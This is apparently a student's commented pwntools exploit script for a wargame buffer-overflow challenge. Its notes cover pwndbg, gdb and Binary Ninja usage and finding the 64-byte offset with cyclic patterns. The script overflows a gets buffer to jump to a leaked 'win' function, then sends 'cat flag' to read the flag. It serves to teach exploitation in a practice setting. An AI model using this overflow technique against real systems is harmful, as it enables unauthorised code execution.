#!/usr/bin/env python3
from pwn import *

# Notes:
# - in pwndbg, command 'checksec' shows whether a stack canary exists and if nx is enabled
# - in pwndbg, command 'canary' leaks the address and value of the stack canary
# - in pwndbg, command 'cyclic 100' makes a 100 byte sequence where all 4 byte subsequences are unique
# this allows us to overflow using this cyclic sequence, and then when our desired value is overwritten by a binary subsequence gaaa (or 0x6161616b),
# we can use the command 'cyclic -l 0x6161616b' to find the offset for this subsequence gaaa, showing you where things are and giving us our required overflow offset
# - the command objdump -t blind lists all the sections/functions in a binary, allowing you to find functions you might want to jump to so you can gain shell access
# - useful gdb commands are gdb jump (to open the binary jump in gdb), break main (to run until we reach the main function),
# run (to begin executing the binary), next/step (to go through each line of the code) and ni (to step through each line in assembly)
# - in gdb, step will enter any functions called, whilst next will simply call the function and stop once it returns
# - remember stack canary is placed before the return address, and ends in a 0 byte (would appear at the front if shown in little endian however). This 0 byte stops functions such as strcpy from simply reading the stack canary, as it will see the 0 byte first and stop reading before seeing the other 3 bytes.
# - in binary ninja, click the graph dissassembler option in the bottom right corner to view the graph. 
# - also to access certain functions (such as main), on the left hand side there's a list of functions.
# - binary ninja can also attempt to convert assembly back into source code (C) by clicking 'options'
# in the bottom right corner and then 'High Level IL'
# - to tell if a variable is on the stack, in binary ninja its address will be in relation to ebp (such as ebp -0x8). If it is a global variable (hence not on the stack and in the data section), it will be in some other area of memory (such as ebx - 0x2c), and it will probably give the name for the variable.
# - if we want to print an int in readable address form (hexadecimal), use the Python hex wrapper
# - similar to in pwndbg, pwntools can also generate unique sequences using 
# g = cyclic_gen() to create a generator, g.get() to get the sequence (doing g.get(300) creates a sequence of length 300),
# and g.find(b'racz') to find the position of the subsequence 'racz'.
# - in gdb, command x 0xffffce90 prints the contents at that address

# Before creating the script:
# Using pwndbg, I used the command cyclic 100 to create an input sequence, 
# and then entered this as input into gets. This overflows the buffer and overwrites
# the address that we eventually jump to

# Since the binary prints the address of the function we are about to jump to, 
# we can see the value we have written here is 0x61616171, or 'qaaa'.
# Using cyclic -l 0x61616171 gives the result 64, which tells us the address 
# for the function we jump to is stored at an offset of 64 bytes (immediately after the buffer ends)

# Hence, we want to pass 64 bytes of anything followed by the address of the 'win' function

# The script:
p = remote("plsdonthaq.me", 2001)

# To begin, the binary prints the address of the winning function, so we want to
# extract and store this for later. 
# In this example, we extract the string '0x8048536' and convert it to an int of base 0
# NOTE: When extracting addresses, they should be of the form 0x8048536, of type int with base 0.
# If you get an error 'invalid literal for int() with base 10', then you need
# to set the base to 0 like below. Remember base 10 is for regular math numbers, and base 0 is for addresses
p.recvuntil("at ")
win = int(p.recvline()[:-1], 0)

# Here we are overflowing the buffer through gets.
# First, we want to put a 'b' in front of the string to make it a byte string.
# Next, we send 64 'A' characters, with each character being 1 byte in length.
# Then, we simply pack a 32 bit value with the function address. Also note our system is little endian so we don't need to convert this.
# NOTE: When using p32(win), which converts an address into a 32 bit/4 byte sequence in binary,
# this takes in an int of base 0 of the form 0x8048536
#p.sendline(b"A"*64 + p32(win))

# Alternatively to doing the above, we can use the following, which takes in our offset as a key,
# and then the value you want appended to it.
# Hence this creates a byte string where the first 64 characters are anything, and then after this it sends what you desire
p.sendline(flat({
  64: p32(win)
  }))

# Rather than have p.interactive() at the end of the script and then manually get the flag in the terminal,
# we can simply send the command 'cat flag' within the script, making it fully automated
p.recvuntil("flow\n")
p.sendline("cat flag")
flag = p.recvuntil("}")
print(flag)
